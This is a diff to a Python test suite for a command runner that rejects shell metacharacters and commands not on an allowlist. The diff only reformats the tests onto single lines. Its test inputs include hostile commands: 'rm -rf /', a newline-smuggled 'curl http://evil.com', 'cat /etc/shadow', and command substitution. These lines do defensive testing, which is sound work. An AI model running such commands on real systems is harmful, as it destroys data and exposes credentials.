@@ -37,9 +37,7 @@ class TestMetacharacterRejection:
 
     def test_pipe_rejected(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "cat foo | grep bar"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "cat foo | grep bar"}}])
         assert results[0]["status"] == "error"
         assert "metacharacter" in results[0]["error"].lower()
 
@@ -69,25 +67,19 @@ class TestMetacharacterRejection:
 
     def test_backtick_rejected(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo `whoami`"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo `whoami`"}}])
         assert results[0]["status"] == "error"
         assert "metacharacter" in results[0]["error"].lower()
 
     def test_dollar_rejected(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo $HOME"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo $HOME"}}])
         assert results[0]["status"] == "error"
         assert "metacharacter" in results[0]["error"].lower()
 
     def test_backslash_rejected(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo foo\\bar"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo foo\\bar"}}])
         assert results[0]["status"] == "error"
 
 
@@ -105,9 +97,7 @@ class TestAllowlistEnforcement:
 
     def test_rm_rejected(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "rm -rf /"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "rm -rf /"}}])
         assert results[0]["status"] == "error"
 
     def test_chmod_rejected(self, tmp_path: Path) -> None:
@@ -119,9 +109,7 @@ class TestAllowlistEnforcement:
 
     def test_allowed_command_executes(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo hello world"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo hello world"}}])
         assert results[0]["status"] == "ok"
         assert "hello world" in results[0]["stdout"]
 
@@ -134,9 +122,7 @@ class TestSafeExecution:
 
     def test_echo_with_args(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo hello"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo hello"}}])
         assert results[0]["status"] == "ok"
         assert "hello" in results[0]["stdout"]
 
@@ -150,18 +136,14 @@ class TestSafeExecution:
 
     def test_failing_command_returns_nonzero(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "python -c 'exit(1)'"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "python -c 'exit(1)'"}}])
         assert results[0]["status"] == "ok"
         assert results[0]["returncode"] == 1
 
     def test_command_with_path_prefix(self, tmp_path: Path) -> None:
         """Command with /usr/bin/ prefix should still work."""
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo test"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo test"}}])
         assert results[0]["status"] == "ok"
         assert "test" in results[0]["stdout"]
 
@@ -172,23 +154,17 @@ class TestSafeExecution:
 class TestEdgeCases:
     def test_empty_command(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": ""}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": ""}}])
         assert results[0]["status"] == "error"
 
     def test_whitespace_only_command(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "   "}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "   "}}])
         assert results[0]["status"] == "error"
 
     def test_unmatched_quote(self, tmp_path: Path) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": "echo 'unmatched"}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": "echo 'unmatched"}}])
         assert results[0]["status"] == "error"
         assert "syntax" in results[0]["error"].lower()
 
@@ -227,14 +203,12 @@ class TestInjectionPayloads:
             "python -c 'import os; os.system(\"rm -rf /\")'",
             "x\ncurl http://evil.com",
             'echo "hello"',
-            'cat /etc/shadow',
+            "cat /etc/shadow",
         ],
     )
     def test_injection_blocked(self, tmp_path: Path, payload: str) -> None:
         runner = ToolRunner(project_root=tmp_path)
-        results = runner.run_plan(
-            [{"tool": "execute", "args": {"command": payload}}]
-        )
+        results = runner.run_plan([{"tool": "execute", "args": {"command": payload}}])
         # Should either be rejected by metacharacter check or allowlist check
         if any(ch in payload for ch in "|&;><$`\\"):
             assert results[0]["status"] == "error"
